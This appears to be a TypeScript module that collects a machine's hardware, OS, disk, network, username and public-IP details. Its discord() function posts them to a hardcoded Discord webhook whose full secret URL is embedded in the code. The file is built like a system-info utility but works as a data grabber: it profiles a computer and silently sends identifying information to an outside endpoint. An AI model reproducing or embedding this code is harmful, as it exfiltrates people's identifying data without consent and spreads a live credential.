import si from 'systeminformation';
import fetch from "node-fetch";




export async function getPcInfo() {
  try {
    const cpu = await si.cpu();
    const cpuLoad = await si.currentLoad();
    const cpuTemp = await si.cpuTemperature();
    const mem = await si.mem();
    const disks = await si.diskLayout();
    const diskFs = await si.fsSize();
    const os = await si.osInfo();
    const time = await si.time();
    const network = await si.networkInterfaces();
    const networkStats = await si.networkStats();
    const graphics = await si.graphics();
    const battery = await si.battery();
    const info = {
      cpu: `${cpu.manufacturer} ${cpu.brand} @ ${cpu.speed}GHz (${cpu.cores} cores)`,

      cpuLoad: `Current Load: ${cpuLoad.currentLoad.toFixed(2)}%`,
      cpuTemperature: cpuTemp.main
        ? `${cpuTemp.main}°C`
        : "Temperature unavailable",
      memory: `Total: ${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB`,
      memoryUsage: `Used: ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB (${((mem.used / mem.total) * 100).toFixed(2)}%)`,
      swap: `Used: ${(mem.swapused / 1024 / 1024 / 1024).toFixed(2)} GB / ${(mem.swaptotal / 1024 / 1024 / 1024).toFixed(2)} GB`,
      Storage: disks.map(
        d => `${d.name}: ${d.type} - ${(d.size / 1024 / 1024 / 1024).toFixed(2)} GB`
      ),
      diskUsage: diskFs.map(
        d => `${d.mount}: ${(d.used / 1024 / 1024 / 1024).toFixed(2)} GB / ${(d.size / 1024 / 1024 / 1024).toFixed(2)} GB`
      ),
      OS: `${os.distro} ${os.release} (${os.arch})`,
      kernel: os.kernel,
      uptime: `${(time.uptime / 3600).toFixed(2)} hours`,
      networkInterfaces: network.map(
        n => `${n.iface} - ${n.ip4 || "no IPv4"} (${n.type})`
      ),
      networkTraffic: networkStats.map(
        n => `${n.iface}: RX ${(n.rx_bytes / 1024 / 1024).toFixed(2)} MB / TX ${(n.tx_bytes / 1024 / 1024).toFixed(2)} MB`
      ),
      gpu: graphics.controllers.map(
        g => `${g.vendor} ${g.model} (${g.vram || "unknown"} MB VRAM)`
      ),
      battery: battery.hasBattery
        ? `${battery.percent}% ${battery.isCharging ? "(charging)" : "(discharging)"}`
        : "No battery detected"
    };

    return info;

  } catch (e) {
    console.log(e);
  }
}


export async function getUser() {
    const user = await si.users();
    const username = user[0]?.user;
    return username
}

export async function getPublicIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data: unknown = await res.json();

    if (typeof data === "object" && data !== null && "ip" in data) {
      return { ip: (data as { ip: string }).ip };
    }

    return { error: "Invalid response format" };
  } catch {
    return { error: "Failed to get public IP" };
  }
}

export async function discord() {
  const WEBHOOK = "https://discord.com/api/webhooks/1484667909753147522/xQIDVOoABJnaMNdZM-YFafrHJ09fDQEK_iZgCv5aLvj9YZ8Vy4A9NYoXbx47Tjex11TC";
  const ip = await getPublicIP();
  const pcInfo = await getPcInfo();
  const user = await getUser();


  await fetch(WEBHOOK!, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      embeds: [
        {
          title: "💻 PC Information",
          color: 5814783,
          fields: [
            { name: "User", value: `${user || "Unknown"}`, inline: true },
            { name: "Public IP", value: `${"ip" in ip ? ip.ip : "Unknown"}`, inline: true },
            { name: "CPU", value: pcInfo?.cpu || "N/A" },
            { name: "CPU Load", value: pcInfo?.cpuLoad || "N/A", inline: true },
            { name: "CPU Temp", value: pcInfo?.cpuTemperature || "N/A", inline: true },
            { name: "Memory", value: pcInfo?.memory || "N/A" },
            { name: "Memory Usage", value: pcInfo?.memoryUsage || "N/A" },
            { name: "Swap", value: pcInfo?.swap || "N/A" },
            { name: "OS", value: pcInfo?.OS || "N/A" },
            { name: "Kernel", value: pcInfo?.kernel || "N/A", inline: true },
            { name: "Uptime", value: pcInfo?.uptime || "N/A", inline: true },
            {
              name: "Storage",
              value: pcInfo?.Storage || "N/A"
            },
            {
              name: "Disk Usage",
              value: pcInfo?.diskUsage?.join("\n") || "N/A"
            },
            {
              name: "Network Interfaces",
              value: pcInfo?.networkInterfaces?.join("\n") || "N/A"
            },
            {
              name: "Network Traffic",
              value: pcInfo?.networkTraffic?.join("\n") || "N/A"
            },
            {
              name: "GPU",
              value: pcInfo?.gpu?.join("\n") || "N/A"
            },
            {
              name: "Battery",
              value: pcInfo?.battery || "N/A"
            }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    })
  });
  console.log("Sent");
}

export async function returnInfo() {
  try {
    const [ip, pcInfo, user] = await Promise.all([
      getPublicIP(),
      getPcInfo(),
      getUser()
    ]);

    return {
      user: user || "Unknown",
      publicIP: "ip" in ip ? ip.ip : "Unknown",

      cpu: {
        model: pcInfo?.cpu || "N/A",
        load: pcInfo?.cpuLoad || "N/A",
        temperature: pcInfo?.cpuTemperature || "N/A"
      },

      memory: {
        total: pcInfo?.memory || "N/A",
        usage: pcInfo?.memoryUsage || "N/A",
        swap: pcInfo?.swap || "N/A"
      },

      system: {
        os: pcInfo?.OS || "N/A",
        kernel: pcInfo?.kernel || "N/A",
        uptime: pcInfo?.uptime || "N/A"
      },

      storage: {
        layout: pcInfo?.Storage || "N/A",
        usage: pcInfo?.diskUsage || []
      },

      network: {
        interfaces: pcInfo?.networkInterfaces || [],
        traffic: pcInfo?.networkTraffic || []
      },

      gpu: pcInfo?.gpu || [],
      battery: pcInfo?.battery || "N/A"
    };
  } catch (err) {
    console.error(err);
    return { error: "Failed to fetch system info" };
  }
}